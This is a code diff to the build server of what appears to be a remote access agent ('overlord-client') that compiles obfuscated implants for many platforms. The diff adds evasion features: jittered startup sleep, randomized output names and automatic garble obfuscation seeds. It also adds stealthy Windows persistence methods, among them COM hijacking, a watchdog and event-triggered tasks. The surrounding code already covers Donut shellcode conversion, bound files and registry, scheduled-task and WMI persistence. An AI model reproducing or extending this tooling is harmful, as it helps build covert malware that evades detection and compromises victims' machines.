@@ -84,8 +84,11 @@ function resolveClientBuildCacheRoot(): string {
 function resolveExplicitAndroidNdkToolchainBin(): string | null {
   const explicit = process.env.ANDROID_NDK_HOME?.trim();
   if (!explicit) return null;
-  const hostArch = process.arch === "arm64" ? "linux-aarch64" : "linux-x86_64";
-  const toolchainBin = path.join(explicit, "toolchains", "llvm", "prebuilt", hostArch, "bin");
+  let hostTriple: string;
+  if (process.platform === "win32") hostTriple = "windows-x86_64";
+  else if (process.platform === "darwin") hostTriple = process.arch === "arm64" ? "darwin-arm64" : "darwin-x86_64";
+  else hostTriple = process.arch === "arm64" ? "linux-aarch64" : "linux-x86_64";
+  const toolchainBin = path.join(explicit, "toolchains", "llvm", "prebuilt", hostTriple, "bin");
   try {
     return fs.existsSync(toolchainBin) ? toolchainBin : null;
   } catch {
@@ -140,6 +143,8 @@ type BuildProcessConfig = {
   criticalProcess?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
+  sleepJitterSeconds?: number;
+  randomizeOutputName?: boolean;
   boundFiles?: BoundFile[];
   useDonut?: boolean;
   donutSingleThreaded?: boolean;
@@ -930,8 +935,8 @@ export async function startBuildProcess(
     if (hasAndroidTargets) {
       sendToStream({
         type: "output",
-        text: "WARNING: Android targets are severely untested and will probably not work right.\n",
-        level: "warn",
+        text: "Note: Android targets require the Android NDK. Core agent features (shell, files, processes) work; Windows-only features are stubbed.\n",
+        level: "info",
       });
     }
 
@@ -1298,9 +1303,15 @@ func runBoundFiles() {
       const isIosTarget = os === "ios";
       const effectiveOs = isIosTarget ? "darwin" : os;
       const targetKey = `${effectiveOs}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
-      const namePrefix = config.outputName || "agent";
       const winExt = config.outputExtension || ".exe";
       const buildSlug = buildId.substring(0, 8);
+      let namePrefix: string;
+      if (config.randomizeOutputName && !config.outputName) {
+        namePrefix = require("crypto").randomBytes(5).toString("hex");
+        sendToStream({ type: "output", text: `Random output name: ${namePrefix}\n`, level: "info" });
+      } else {
+        namePrefix = config.outputName || "agent";
+      }
       let friendlyOutputName = deps.sanitizeOutputName(
         platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
       );
@@ -1368,10 +1379,11 @@ func runBoundFiles() {
           env.CGO_LDFLAGS = `${env.CGO_CFLAGS} -fuse-ld=lld`;
           sendToStream({ type: "output", text: `Darwin CGO cross-toolchain: ${triple} with uploaded SDK\n`, level: "info" });
         } else if (os === "android" && ndkBin) {
+          const ndkExt = process.platform === "win32" ? ".cmd" : "";
           const ndkCcByTarget: Record<string, string> = {
-            "android/amd64": "x86_64-linux-android21-clang",
-            "android/arm64": "aarch64-linux-android21-clang",
-            "android/arm/v7": "armv7a-linux-androideabi21-clang",
+            "android/amd64": `x86_64-linux-android21-clang${ndkExt}`,
+            "android/arm64": `aarch64-linux-android21-clang${ndkExt}`,
+            "android/arm/v7": `armv7a-linux-androideabi21-clang${ndkExt}`,
           };
           const basename = ndkCcByTarget[targetKey];
           if (basename) {
@@ -1511,9 +1523,16 @@ func runBoundFiles() {
       }
 
       if (config.sleepSeconds && config.sleepSeconds > 0) {
-        const sleepFlag = `-X overlord-client/cmd/agent/config.DefaultSleepSeconds=${config.sleepSeconds}`;
+        let effectiveSleep = config.sleepSeconds;
+        if (config.sleepJitterSeconds && config.sleepJitterSeconds > 0) {
+          const jitter = Math.floor(Math.random() * config.sleepJitterSeconds);
+          effectiveSleep = config.sleepSeconds + jitter;
+          sendToStream({ type: "output", text: `Startup sleep: ${effectiveSleep}s (base=${config.sleepSeconds}s jitter=${jitter}s)\n`, level: "info" });
+        } else {
+          sendToStream({ type: "output", text: `Startup sleep: ${effectiveSleep}s\n`, level: "info" });
+        }
+        const sleepFlag = `-X overlord-client/cmd/agent/config.DefaultSleepSeconds=${effectiveSleep}`;
         ldflags = ldflags ? `${ldflags} ${sleepFlag}` : sleepFlag;
-        sendToStream({ type: "output", text: `Startup sleep: ${config.sleepSeconds}s\n`, level: "info" });
       }
 
       if (config.fetchPublicIP) {
@@ -1611,7 +1630,13 @@ func runBoundFiles() {
         if (config.obfuscate) {
           if (config.garbleLiterals) garbleFlags.push("-literals");
           if (config.garbleTiny) garbleFlags.push("-tiny");
-          if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
+          if (config.garbleSeed) {
+            garbleFlags.push(`-seed=${config.garbleSeed}`);
+          } else {
+            const autoSeed = require("crypto").randomBytes(8).toString("hex");
+            garbleFlags.push(`-seed=${autoSeed}`);
+            sendToStream({ type: "output", text: `Garble: auto seed=${autoSeed}\n`, level: "info" });
+          }
         }
 
         // Base tags: always present regardless of build pass
@@ -1640,6 +1665,9 @@ func runBoundFiles() {
           if (methods.includes("registry")) winPersistTags.push("persist_registry");
           if (methods.includes("taskscheduler")) winPersistTags.push("persist_taskscheduler");
           if (methods.includes("wmi")) winPersistTags.push("persist_wmi");
+          if (methods.includes("watchdog")) winPersistTags.push("persist_watchdog");
+          if (methods.includes("comhijack")) winPersistTags.push("persist_comhijack");
+          if (methods.includes("eventtask")) winPersistTags.push("persist_eventtask");
         }
 
         let skipTarget = false;
